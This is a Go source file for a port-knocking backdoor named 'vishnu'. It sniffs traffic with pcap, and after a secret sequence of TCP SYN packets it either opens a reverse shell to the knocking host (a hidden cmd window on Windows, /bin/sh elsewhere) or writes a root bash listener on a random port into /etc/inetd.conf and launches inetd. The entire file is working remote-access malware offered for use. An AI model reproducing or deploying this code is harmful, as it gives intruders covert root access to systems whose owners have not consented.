package main

import (
	"bufio"
	"errors"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"syscall"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

var (
	targetInterface = "ens160"
	snaplen         = int32(1600)
	// vishnu uses tcp port knocking
	filter = "tcp"
	// ports in order to port knock on
	secretPorts = []int{1, 2, 3, 4}
	// how far into the sequence we are
	// when secretCounter == len(secretPorts),
	// port knocking is complete and shell is given
	secretCounter = 0
)

const (
	// if true, connect back to knocking
	// IP on connectbackPort
	connectback = false
	// only relevant if connectback is true
	connectbackPort = "8080"
)

func main() {
	if runtime.GOOS == "windows" {
		targetInterface = GetWinAdapter()
	}
	// Read package and analze them
	handle, err := pcap.OpenLive(targetInterface, snaplen, true, pcap.BlockForever)
	errorPrinter(err)

	handle.SetBPFFilter(filter)
	packets := gopacket.NewPacketSource(handle, handle.LinkType()).Packets()
	for pkt := range packets {
		// Your analysis here! Get the important stuff
		printPacketInfo(pkt)
	}
}

func GetWinAdapter() string {
	var iface string
	output, err := exec.Command("cmd.exe", "/c", "getmac /fo csv /v | findstr Ethernet").Output() //getting ethernet description for pcap
	if err != nil {
		log.Panicln(err)
	}
	startIndex := strings.Index(string(output), "_{")
	finalIndex := strings.Index(string(output), "}")

	temp := string(output)[startIndex+2 : finalIndex]
	iface = "\\Device\\NPF_{" + temp + "}"

	return iface
}

func errorPrinter(err error) {
	if err != nil {
		log.Panicln(err)
	}
}

func grabRemoteIP(packet gopacket.Packet) (string, error) {
	iplayer := packet.Layer(layers.LayerTypeIPv4)
	if iplayer == nil {
		return "", errors.New("Packet is not IPv4")
	}

	ip, _ := iplayer.(*layers.IPv4)
	return ip.SrcIP.String(), nil
}

func printPacketInfo(packet gopacket.Packet) {

	// Let's see if the packet is TCP
	tcpLayer := packet.Layer(layers.LayerTypeTCP)
	if tcpLayer != nil {
		tcp, _ := tcpLayer.(*layers.TCP)

		// Check the TCP Flag
		if tcp.SYN {
			// fmt.Printf("From port %d to %d\n", tcp.SrcPort, tcp.DstPort)
			// Check dst port for secret port
			if tcp.DstPort == layers.TCPPort(secretPorts[secretCounter]) {
				secretCounter++
			} else {
				// reset counter
				secretCounter = 0
			}
		}
	}

	if secretCounter == len(secretPorts) {
		secretCounter = 0
		// grab  IP address
		ip, err := grabRemoteIP(packet)
		// TODO maybe just listen if connectback is
		// on and we can't get the remote IP
		if connectback && err != nil {
			return
		}

		// open the gateway
		go vishnu(ip)
	}

	// Check for errors
	if err := packet.ErrorLayer(); err != nil {
		fmt.Println("Error decoding some part of the packet:", err)
	}
}

func connectBack(ip string) {
	// TODO make this a PTY shell instead
	addr := net.JoinHostPort(ip, connectbackPort)
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		// TODO: figure out error handling
		return
	}

	if runtime.GOOS == "windows" {
		r := bufio.NewReader(conn)
		for {
			order, err := r.ReadString('\n')
			if nil != err {
				conn.Close()
				return
			}

			cmd := exec.Command("cmd", "/C", order)
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			out, _ := cmd.CombinedOutput()

			conn.Write(out)
		}
	} else {
		cmd := exec.Command("/bin/sh")
		cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
		cmd.Run()
		conn.Close()
	}

}

func vishnu(ip string) {
	if connectback || runtime.GOOS == "windows" {
		connectBack(ip)
	} else {
		randomPort := rand.Intn(65535-100) + 100
		// println("The doors are open on port ", strconv.Itoa(randomPort))
		// Append to a file /etc/inetd.conf
		fd, err := os.OpenFile("/etc/inetd.conf", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
		errorPrinter(err)
		defer fd.Close()

		if _, err = fd.WriteString(strconv.Itoa(randomPort) + " stream tcp nowait root /bin/bash bash\n"); err != nil {
			log.Panicln(err)
		}

		exec.Command("/usr/sbin/inetd").Run()
	}
}
